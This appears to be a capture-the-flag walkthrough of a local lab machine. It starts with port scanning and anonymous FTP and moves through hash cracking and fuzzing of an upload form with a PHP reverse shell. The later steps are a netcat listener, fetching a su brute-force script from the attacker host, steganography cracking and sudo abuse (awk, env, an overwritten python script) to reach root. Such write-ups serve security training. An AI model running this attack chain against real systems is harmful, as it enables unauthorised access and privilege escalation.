# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` bash
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.546 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.084 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1016ms
rtt min/avg/max/mdev = 0.084/0.315/0.546/0.231 ms
```
## Ports scanning (TCP)
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 14:18 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
MAC Address: DE:69:7E:EF:44:F3 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```
``` bash
sudo nmap -p21,80 -sS -sCV -T4 --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 14:18 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000032s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 65534    65534          33 Sep 12  2024 anon.txt
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: DE:69:7E:EF:44:F3 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds
```
# FTP enumeration
## Anonymous login
``` bash
ftp 172.17.0.2
ftp> get anon.txt
```
``` bash
cat anon.txt
53dd9c6005f3cdfc5a69c5c07388016d
```
## Hash
``` bash
john --format=raw-MD5 anon.txt
justin           (?)
```
# Web enumeration
## Dir fuzzing
``` bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 11008]
uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
server-status        (Status: 403) [Size: 275]
file_upload.php      (Status: 200) [Size: 468]
Progress: 830564 / 830564 (100.00%)
===============================================================
Finished
===============================================================
```
## Malicious upload
``` bash
curl -s http://172.17.0.2/file_upload.php
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Subida de archivos</title>
</head>
<body>
<form action="subir_archivo.php" method="post" enctype="multipart/form-data">
    <label for="archivo">Selecciona un archivo:</label>
    <input type="file" name="archivo" id="archivo">
    <input type="submit" value="Subir archivo" name="submit">
</form>

</body>
</html>
```
``` bash
ffuf -u http://172.17.0.2/subir_archivo.php \
-w /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt \
-X POST \
-H "Content-Type: multipart/form-data; boundary=----geckoformboundary124fefaad508acff61f831ea94404a67" \
-d $'------geckoformboundary124fefaad508acff61f831ea94404a67\r\nContent-Disposition: form-data; name="archivo"; filename="revshell.FUZZ"\r\nContent-Type: application/octet-stream\r\n\r\n<?php\n// php-reverse-shell ...\n?>\r\n------geckoformboundary124fefaad508acff61f831ea94404a67\r\nContent-Disposition: form-data; name="submit"\r\n\r\nSubir archivo\r\n------geckoformboundary124fefaad508acff61f831ea94404a67--' \
-fs 33

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://172.17.0.2/subir_archivo.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt
 :: Header           : Content-Type: multipart/form-data; boundary=----geckoformboundary124fefaad508acff61f831ea94404a67
 :: Data             : ------geckoformboundary124fefaad508acff61f831ea94404a67
Content-Disposition: form-data; name="archivo"; filename="revshell.FUZZ"
Content-Type: application/octet-stream

<?php
// php-reverse-shell ...
?>
------geckoformboundary124fefaad508acff61f831ea94404a67
Content-Disposition: form-data; name="submit"

Subir archivo
------geckoformboundary124fefaad508acff61f831ea94404a67--
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 33
________________________________________________

phar                    [Status: 200, Size: 50, Words: 8, Lines: 1, Duration: 1ms]
:: Progress: [31/31] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
## Reverse shell
Uploading the reverse shell PHP PentestMonkey 
``` bash
curl -s http://172.17.0.2/uploads/revshell.phar
```
``` bash
sudo nc -lvnp 4443
whoami
www-data
```
# Privilege escalation
``` bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
fernando:x:1000:1000::/home/fernando:/bin/bash
mario:x:1001:1001::/home/mario:/bin/bash
julen:x:1002:1002::/home/julen:/bin/bash
iker:x:1003:1003::/home/iker:/bin/bash
```
## Lateral movement to fernando
Let's brute force to another user
``` bash
wget http://172.17.0.1:5000/Linux-Su-Force.sh
chmod +x Linux-Su-Force.sh
wget http://172.17.0.1:5000/rockyou.txt
./Linux-Su-Force.sh fernando rockyou.txt
Contraseña encontrada para el usuario fernando: chocolate
```
``` bash
su fernando
```
## Lateral movement to mario
``` bash
ls -l
-rw-rw-r-- 1 fernando fernando 187638 Sep 11  2024 dragon-medieval.jpeg
python3 -m http.server 8000
```
``` bash
wget http://172.17.0.2:8000/dragon-medieval.jpeg
stegseek dragon-medieval.jpeg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "secret"
[i] Original filename: "pass.txt".
[i] Extracting to "dragon-medieval.jpeg.out".
steghide extract -sf dragon-medieval.jpeg
Enter passphrase:
wrote extracted data to "pass.txt".
cat pass.txt
cbfdac6008f9cab4083784cbd1874f76618d2a97
john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
password123      (?)
```
This is the password for mario
``` bash
su mario
```
## Lateral movement to julen
``` bash
sudo -l
(julen) NOPASSWD: /usr/bin/awk
sudo -u julen /usr/bin/awk 'BEGIN {system("/bin/sh")}'
```
## Lateral movement to iker
``` bash
sudo -l
(iker) NOPASSWD: /usr/bin/env
sudo -u iker /usr/bin/env /bin/bash
```
## Privilege escalation to root
``` bash
sudo -l
(ALL) NOPASSWD: /usr/bin/python3 /home/iker/geo_ip.py
rm -f /home/iker/geo_ip.py
echo 'import os; os.execl("/bin/sh", "sh")' > geo_ip.py
sudo -u root /usr/bin/python3 /home/iker/geo_ip.py
whoami
root
```
